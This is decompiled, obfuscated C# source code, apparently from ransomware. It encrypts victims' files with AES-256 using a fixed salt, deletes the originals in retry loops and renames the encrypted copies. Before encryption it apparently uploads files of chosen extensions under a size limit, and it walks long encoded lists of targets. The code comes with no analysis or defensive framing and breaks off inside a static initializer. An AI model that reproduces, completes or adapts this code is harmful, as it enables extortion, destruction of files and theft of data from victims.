									yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, OasPkTxEhkqARxDV);
								}
								else
								{
									yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!fYzeXSQMFrly)
									{
										aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, OasPkTxEhkqARxDV);
									}
									else
									{
										aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (keaHDdagjiDMCTfH)
									{
										try
										{
											File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + hsgCGlZmFqZgdS.getString_0(107389809) + ex6.Message + hsgCGlZmFqZgdS.getString_0(107396290));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!RySdpyQRxMNXcP)
						{
							if (!fYzeXSQMFrly)
							{
								yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + hsgCGlZmFqZgdS.getString_0(107389786), OasPkTxEhkqARxDV);
							}
							else
							{
								yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + hsgCGlZmFqZgdS.getString_0(107389786), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!fYzeXSQMFrly)
								{
									aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi, OasPkTxEhkqARxDV);
								}
								else
								{
									aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (keaHDdagjiDMCTfH)
								{
									try
									{
										File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + hsgCGlZmFqZgdS.getString_0(107389809) + ex8.Message + hsgCGlZmFqZgdS.getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (fYzeXSQMFrly)
						{
							if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
							{
								GoDAxkQbrqjFWYn(CS_0024_003C_003E8__locals0.itKWIypHRJi + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, bytes2);
							}
							else
							{
								GoDAxkQbrqjFWYn(CS_0024_003C_003E8__locals0.itKWIypHRJi, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			CS_0024_003C_003E8__locals0.AKWToBmSQCY.Remove(CS_0024_003C_003E8__locals0.itKWIypHRJi);
		});
	}

	private static void ZunguhwEHnwVZ(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (yXsKxXdmTMDNpi == getString_0(107396964))
					{
						foreach (string item in mvTZfeUAoYGCG)
						{
							if (string_0.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396964))
							{
								if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396421))
							{
								try
								{
									TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389769)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389769), getString_0(107394035)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void aofPqeDxZqP(string string_0, string string_1, byte[] byte_0)
	{
		if (yXsKxXdmTMDNpi == getString_0(107396964))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in mvTZfeUAoYGCG)
			{
				if (string_0.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396964))
				{
					if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396421))
				{
					try
					{
						TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = HfiFGrXOdAS.empuJnDsZdZVMo(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void yyIfDArNcCubd(string string_0, string string_1, byte[] byte_0)
	{
		ZwrReIenxYWY CS_0024_003C_003E8__locals0 = new ZwrReIenxYWY();
		CS_0024_003C_003E8__locals0.QDlTULXGiBGxg = string_0;
		CS_0024_003C_003E8__locals0.GAyopPluabSls = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string gAyopPluabSls = CS_0024_003C_003E8__locals0.GAyopPluabSls;
			FileStream fileStream = new FileStream(gAyopPluabSls, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (dYQrpOPXkxY == getString_0(107396964))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.QDlTULXGiBGxg, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.QDlTULXGiBGxg, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.QDlTULXGiBGxg, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.GAyopPluabSls.Length > 0)
				{
					if (yXsKxXdmTMDNpi == getString_0(107396964))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.QDlTULXGiBGxg, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in mvTZfeUAoYGCG)
						{
							if (CS_0024_003C_003E8__locals0.QDlTULXGiBGxg.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396964))
							{
								if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), CS_0024_003C_003E8__locals0.QDlTULXGiBGxg);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.QDlTULXGiBGxg.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396421))
							{
								try
								{
									TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), CS_0024_003C_003E8__locals0.QDlTULXGiBGxg);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.QDlTULXGiBGxg);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.GAyopPluabSls.EndsWith(getString_0(107389769)))
					{
						File.Move(CS_0024_003C_003E8__locals0.GAyopPluabSls, CS_0024_003C_003E8__locals0.GAyopPluabSls.Replace(getString_0(107389769), getString_0(107394035)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.GAyopPluabSls))
							{
								File.Delete(CS_0024_003C_003E8__locals0.GAyopPluabSls);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (keaHDdagjiDMCTfH)
			{
				try
				{
					File.AppendAllText(RztYwSIsnQJzs, getString_0(107390565) + CS_0024_003C_003E8__locals0.QDlTULXGiBGxg + getString_0(107389792) + ex2.Message + getString_0(107396273));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = tlnCIdpwTu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				WMwWOqjOFtUT(getString_0(107389707), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> source2 = oqctRyBSIQ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				WMwWOqjOFtUT(getString_0(107392704), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> ylTzmyhpiwknfhq = YlTzmyhpiwknfhq;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389730)), string_0);
			};
		}
		Parallel.ForEach(ylTzmyhpiwknfhq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (kskmTAbTAdUwgF == getString_0(107396964))
		{
			string[] source3 = fgyftAvJczBLO;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389730)), getString_0(107389673) + string_0 + getString_0(107389696));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!qalydKPwEW().Contains(getString_0(107390431)))
		{
			fgwTRLutHHin(FYfkyKTYUeI);
		}
		else
		{
			List<string> source4 = zDTTWfcIAya;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					WMwWOqjOFtUT(hNmpLWayyKYy(ouaHPvfKVdnz(getString_0(107389691))), string_0);
				};
			}
			Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> source5 = rUYXUMGWrLAx;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389666)), string_0);
			};
		}
		Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> source6 = tmofVFVJKbRY;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				WMwWOqjOFtUT(getString_0(107389617), string_0);
			};
		}
		Parallel.ForEach(source6, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		WMwWOqjOFtUT(getString_0(107389707), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		WMwWOqjOFtUT(getString_0(107392704), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389730)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389730)), getString_0(107389673) + string_0 + getString_0(107389696));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		WMwWOqjOFtUT(hNmpLWayyKYy(ouaHPvfKVdnz(getString_0(107389691))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389666)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		WMwWOqjOFtUT(getString_0(107389617), string_0);
	}

	static kdXBbWqHjtnYq()
	{
		Strings.CreateGetStringDelegate(typeof(kdXBbWqHjtnYq));
		HepjTqUkLVyB = getString_0(107394011);
		OasPkTxEhkqARxDV = null;
		xUGtSzShmupOk = getString_0(107396421);
		nnhqbergWhMClf = getString_0(107389640);
		tkcHcCnvalC = new List<string>();
		eDSqKoZuBiFnVQ = new List<string>();
		CocLCSEHmD = getString_0(107396421);
		cGVxFqKPccB = getString_0(107394035);
		vaOvGgHCInLEo = getString_0(107394035);
		tjbwkkqjGcTNHLS = getString_0(107396421);
		iZKhurDDLnidT = 0;
		MQUfpBGDuCn = getString_0(107396421);
		MfkjGXKhxyhehv = getString_0(107396421);
		OtVbJHwGpAtFQyT = getString_0(107396421);
		NCJlttEOSHQg = getString_0(107389627);
		uccGqOrrMM = getString_0(107396964);
		aKzHxVBtSkJm = getString_0(107396421);
		ISWgsPSKHYk = getString_0(107396421);
		MgOyEjlOtOFzUj = getString_0(107396421);
		XJrcacgShCStzR = new List<string>
		{
			hNmpLWayyKYy(getString_0(107389590)),
			hNmpLWayyKYy(getString_0(107389605)),
			hNmpLWayyKYy(getString_0(107389548)),
			hNmpLWayyKYy(getString_0(107389563)),
			hNmpLWayyKYy(getString_0(107390050)),
			hNmpLWayyKYy(getString_0(107389993)),
			hNmpLWayyKYy(getString_0(107389976)),
			hNmpLWayyKYy(getString_0(107389983)),
			hNmpLWayyKYy(getString_0(107389958)),
			hNmpLWayyKYy(getString_0(107389901)),
			hNmpLWayyKYy(getString_0(107389916)),
			hNmpLWayyKYy(getString_0(107389891)),
			hNmpLWayyKYy(getString_0(107389834))
		};
		hxATskUeUhTwX = new List<string>();
		oioNbwnCpXU = getString_0(107396421);
		FgAipgzSjMdCQgJ = getString_0(107396421);
		FARyVqtSMcbb = getString_0(107396421);
		yjAazhPgxhDIu = new List<string>();
		xOOdbsMOOZj = getString_0(107396421);
		eocHXBFcoPc = getString_0(107389809);
		htNfweWWpfJ = getString_0(107396421);
		XfAUBFEpobWyiU = getString_0(107396421);
		oqctRyBSIQ = new List<string>
		{
			hNmpLWayyKYy(getString_0(107389280)),
			hNmpLWayyKYy(getString_0(107389247)),
			hNmpLWayyKYy(getString_0(107389214)),
			hNmpLWayyKYy(getString_0(107389181)),
			hNmpLWayyKYy(getString_0(107389148)),
			hNmpLWayyKYy(getString_0(107389119)),
			hNmpLWayyKYy(getString_0(107389062)),
			hNmpLWayyKYy(getString_0(107389513)),
			hNmpLWayyKYy(getString_0(107389500)),
			hNmpLWayyKYy(getString_0(107389435)),
			hNmpLWayyKYy(getString_0(107389402)),
			hNmpLWayyKYy(getString_0(107389369)),
			hNmpLWayyKYy(getString_0(107389304)),
			hNmpLWayyKYy(getString_0(107389307)),
			hNmpLWayyKYy(getString_0(107388766)),
			hNmpLWayyKYy(getString_0(107388693)),
			hNmpLWayyKYy(getString_0(107388652)),
			hNmpLWayyKYy(getString_0(107388595)),
			hNmpLWayyKYy(getString_0(107388578)),
			hNmpLWayyKYy(getString_0(107388545)),
			hNmpLWayyKYy(getString_0(107389028)),
			hNmpLWayyKYy(getString_0(107388987)),
			hNmpLWayyKYy(getString_0(107388914)),
			hNmpLWayyKYy(getString_0(107388881)),
			hNmpLWayyKYy(getString_0(107388864)),
			hNmpLWayyKYy(getString_0(107388807)),
			hNmpLWayyKYy(getString_0(107388254)),
			hNmpLWayyKYy(getString_0(107388225)),
			hNmpLWayyKYy(getString_0(107388152)),
			hNmpLWayyKYy(getString_0(107388127)),
			hNmpLWayyKYy(getString_0(107388062)),
			hNmpLWayyKYy(getString_0(107388517)),
			hNmpLWayyKYy(getString_0(107388452)),
			hNmpLWayyKYy(getString_0(107388371)),
			hNmpLWayyKYy(getString_0(107388306)),
			hNmpLWayyKYy(getString_0(107388281)),
			hNmpLWayyKYy(getString_0(107387704)),
			hNmpLWayyKYy(getString_0(107387663)),
			hNmpLWayyKYy(getString_0(107387654)),
			hNmpLWayyKYy(getString_0(107387609)),
			hNmpLWayyKYy(getString_0(107387580)),
			hNmpLWayyKYy(getString_0(107387515)),
			hNmpLWayyKYy(getString_0(107387954)),
			hNmpLWayyKYy(getString_0(107387921)),
			hNmpLWayyKYy(getString_0(107387912)),
			hNmpLWayyKYy(getString_0(107387831)),
			hNmpLWayyKYy(getString_0(107387786)),
			hNmpLWayyKYy(getString_0(107387233)),
			hNmpLWayyKYy(getString_0(107387156)),
			hNmpLWayyKYy(getString_0(107387143)),
			hNmpLWayyKYy(getString_0(107387098)),
			hNmpLWayyKYy(getString_0(107387025)),
			hNmpLWayyKYy(getString_0(107387496)),
			hNmpLWayyKYy(getString_0(107387435)),
			hNmpLWayyKYy(getString_0(107387426)),
			hNmpLWayyKYy(getString_0(107387361)),
			hNmpLWayyKYy(getString_0(107387284)),
			hNmpLWayyKYy(getString_0(107387255)),
			hNmpLWayyKYy(getString_0(107386698)),
			hNmpLWayyKYy(getString_0(107386633)),
			hNmpLWayyKYy(getString_0(107386604)),
			hNmpLWayyKYy(getString_0(107386547)),
			hNmpLWayyKYy(getString_0(107386482)),
			hNmpLWayyKYy(getString_0(107386953)),
			hNmpLWayyKYy(getString_0(107386924)),
			hNmpLWayyKYy(getString_0(107386915)),
			hNmpLWayyKYy(getString_0(107386802)),
			hNmpLWayyKYy(getString_0(107386741)),
			hNmpLWayyKYy(getString_0(107386156)),
			hNmpLWayyKYy(getString_0(107386143)),
			hNmpLWayyKYy(getString_0(107386110)),
			hNmpLWayyKYy(getString_0(107386037)),
			hNmpLWayyKYy(getString_0(107385992)),
			hNmpLWayyKYy(getString_0(107386459)),
			hNmpLWayyKYy(getString_0(107386370)),
			hNmpLWayyKYy(getString_0(107386289)),
			hNmpLWayyKYy(getString_0(107386260)),
			hNmpLWayyKYy(getString_0(107386219)),
			hNmpLWayyKYy(getString_0(107385642)),
			hNmpLWayyKYy(getString_0(107385625)),
			hNmpLWayyKYy(getString_0(107385568)),
			hNmpLWayyKYy(getString_0(107385535)),
			hNmpLWayyKYy(getString_0(107385474)),
			hNmpLWayyKYy(getString_0(107385897)),
			hNmpLWayyKYy(getString_0(107388281)),
			hNmpLWayyKYy(getString_0(107385840)),
			hNmpLWayyKYy(getString_0(107385831)),
			hNmpLWayyKYy(getString_0(107385710)),
			hNmpLWayyKYy(getString_0(107385185)),
			hNmpLWayyKYy(getString_0(107385124)),
			hNmpLWayyKYy(getString_0(107385067)),
			hNmpLWayyKYy(getString_0(107385054)),
			hNmpLWayyKYy(getString_0(107384973)),
			hNmpLWayyKYy(getString_0(107388127)),
			hNmpLWayyKYy(getString_0(107385420)),
			hNmpLWayyKYy(getString_0(107385411)),
			hNmpLWayyKYy(getString_0(107385322)),
			hNmpLWayyKYy(getString_0(107388062)),
			hNmpLWayyKYy(getString_0(107385281)),
			hNmpLWayyKYy(getString_0(107385200)),
			hNmpLWayyKYy(getString_0(107384599)),
			hNmpLWayyKYy(getString_0(107384534)),
			hNmpLWayyKYy(getString_0(107384517)),
			hNmpLWayyKYy(getString_0(107388452)),
			hNmpLWayyKYy(getString_0(107384920)),
			hNmpLWayyKYy(getString_0(107387704)),
			hNmpLWayyKYy(getString_0(107388371)),
			hNmpLWayyKYy(getString_0(107384887)),
			hNmpLWayyKYy(getString_0(107384862)),
			hNmpLWayyKYy(getString_0(107388306)),
			hNmpLWayyKYy(getString_0(107384829)),
			hNmpLWayyKYy(getString_0(107384748)),
			hNmpLWayyKYy(getString_0(107384731)),
			hNmpLWayyKYy(getString_0(107388152)),
			hNmpLWayyKYy(getString_0(107384706)),
			hNmpLWayyKYy(getString_0(107384117)),
			hNmpLWayyKYy(getString_0(107384088)),
			hNmpLWayyKYy(getString_0(107384091)),
			hNmpLWayyKYy(getString_0(107384014)),
			hNmpLWayyKYy(getString_0(107383981)),
			hNmpLWayyKYy(getString_0(107383956)),
			hNmpLWayyKYy(getString_0(107383943)),
			hNmpLWayyKYy(getString_0(107384398)),
			hNmpLWayyKYy(getString_0(107384389)),
			hNmpLWayyKYy(getString_0(107384312)),
			hNmpLWayyKYy(getString_0(107384295)),
			hNmpLWayyKYy(getString_0(107384206)),
			hNmpLWayyKYy(getString_0(107384173)),
			hNmpLWayyKYy(getString_0(107383648)),
			hNmpLWayyKYy(getString_0(107383615)),
			hNmpLWayyKYy(getString_0(107383542)),
			hNmpLWayyKYy(getString_0(107388225)),
			hNmpLWayyKYy(getString_0(107384295)),
			hNmpLWayyKYy(getString_0(107383501)),
			hNmpLWayyKYy(getString_0(107383472)),
			hNmpLWayyKYy(getString_0(107383443)),
			hNmpLWayyKYy(getString_0(107383426)),
			hNmpLWayyKYy(getString_0(107383897)),
			hNmpLWayyKYy(getString_0(107383836)),
			hNmpLWayyKYy(getString_0(107383731)),
			hNmpLWayyKYy(getString_0(107383702)),
			hNmpLWayyKYy(getString_0(107383669)),
			hNmpLWayyKYy(getString_0(107383084)),
			hNmpLWayyKYy(getString_0(107383055)),
			hNmpLWayyKYy(getString_0(107383042)),
			hNmpLWayyKYy(getString_0(107382977)),
			hNmpLWayyKYy(getString_0(107382944)),
			hNmpLWayyKYy(getString_0(107383379)),
			hNmpLWayyKYy(getString_0(107383318)),
			hNmpLWayyKYy(getString_0(107383285)),
			hNmpLWayyKYy(getString_0(107383272)),
			hNmpLWayyKYy(getString_0(107383207)),
			hNmpLWayyKYy(getString_0(107383174)),
			hNmpLWayyKYy(getString_0(107382621)),
			hNmpLWayyKYy(getString_0(107382540)),
			hNmpLWayyKYy(getString_0(107388864)),
			hNmpLWayyKYy(getString_0(107382511)),
			hNmpLWayyKYy(getString_0(107382454)),
			hNmpLWayyKYy(getString_0(107382413)),
			hNmpLWayyKYy(getString_0(107382400)),
			hNmpLWayyKYy(getString_0(107382839)),
			hNmpLWayyKYy(getString_0(107382794)),
			hNmpLWayyKYy(getString_0(107382733)),
			hNmpLWayyKYy(getString_0(107382716)),
			hNmpLWayyKYy(getString_0(107382635)),
			hNmpLWayyKYy(getString_0(107382066)),
			hNmpLWayyKYy(getString_0(107382041)),
			hNmpLWayyKYy(getString_0(107381964)),
			hNmpLWayyKYy(getString_0(107381955)),
			hNmpLWayyKYy(getString_0(107381866)),
			hNmpLWayyKYy(getString_0(107388807)),
			hNmpLWayyKYy(getString_0(107382337)),
			hNmpLWayyKYy(getString_0(107382308)),
			hNmpLWayyKYy(getString_0(107382275)),
			hNmpLWayyKYy(getString_0(107382234)),
			hNmpLWayyKYy(getString_0(107382205)),
			hNmpLWayyKYy(getString_0(107388881)),
			hNmpLWayyKYy(getString_0(107382132)),
			hNmpLWayyKYy(getString_0(107381603)),
			hNmpLWayyKYy(getString_0(107381574)),
			hNmpLWayyKYy(getString_0(107386604)),
			hNmpLWayyKYy(getString_0(107381541)),
			hNmpLWayyKYy(getString_0(107381574)),
			hNmpLWayyKYy(getString_0(107381512)),
			hNmpLWayyKYy(getString_0(107381451)),
			hNmpLWayyKYy(getString_0(107381422)),
			hNmpLWayyKYy(getString_0(107381405)),
			hNmpLWayyKYy(getString_0(107381836)),
			hNmpLWayyKYy(getString_0(107381827)),
			hNmpLWayyKYy(getString_0(107381766)),
			hNmpLWayyKYy(getString_0(107381705)),
			hNmpLWayyKYy(getString_0(107381696)),
			hNmpLWayyKYy(getString_0(107381619)),
			hNmpLWayyKYy(getString_0(107381094)),
			hNmpLWayyKYy(getString_0(107381061)),
			hNmpLWayyKYy(getString_0(107380972)),
			hNmpLWayyKYy(getString_0(107380959)),
			hNmpLWayyKYy(getString_0(107380902)),
			hNmpLWayyKYy(getString_0(107380869)),
			hNmpLWayyKYy(getString_0(107381340)),
			hNmpLWayyKYy(getString_0(107381311)),
			hNmpLWayyKYy(getString_0(107381250)),
			hNmpLWayyKYy(getString_0(107381217)),
			hNmpLWayyKYy(getString_0(107381160)),
			hNmpLWayyKYy(getString_0(107381119)),
			hNmpLWayyKYy(getString_0(107413294)),
			hNmpLWayyKYy(getString_0(107413261)),
			hNmpLWayyKYy(getString_0(107413244)),
			hNmpLWayyKYy(getString_0(107413167)),
			hNmpLWayyKYy(getString_0(107413150)),
			hNmpLWayyKYy(getString_0(107413585)),
			hNmpLWayyKYy(getString_0(107413568)),
			hNmpLWayyKYy(getString_0(107413535)),
			hNmpLWayyKYy(getString_0(107413462)),
			hNmpLWayyKYy(getString_0(107413421)),
			hNmpLWayyKYy(getString_0(107413408)),
			hNmpLWayyKYy(getString_0(107383897)),
			hNmpLWayyKYy(getString_0(107413375)),
			hNmpLWayyKYy(getString_0(107412790)),
			hNmpLWayyKYy(getString_0(107412765)),
			hNmpLWayyKYy(getString_0(107412736)),
			hNmpLWayyKYy(getString_0(107412703)),
			hNmpLWayyKYy(getString_0(107412670)),
			hNmpLWayyKYy(getString_0(107412589)),
			hNmpLWayyKYy(getString_0(107413072)),
			hNmpLWayyKYy(getString_0(107413059)),
			hNmpLWayyKYy(getString_0(107412982)),
			hNmpLWayyKYy(getString_0(107412941)),
			hNmpLWayyKYy(getString_0(107412884)),
			hNmpLWayyKYy(getString_0(107412867)),
			hNmpLWayyKYy(getString_0(107412326)),
			hNmpLWayyKYy(getString_0(107412281))
		};
		tlnCIdpwTu = new List<string>
		{
			hNmpLWayyKYy(getString_0(107412208)),
			hNmpLWayyKYy(getString_0(107412191)),
			hNmpLWayyKYy(getString_0(107412110)),
			hNmpLWayyKYy(getString_0(107412093)),
			hNmpLWayyKYy(getString_0(107412524)),
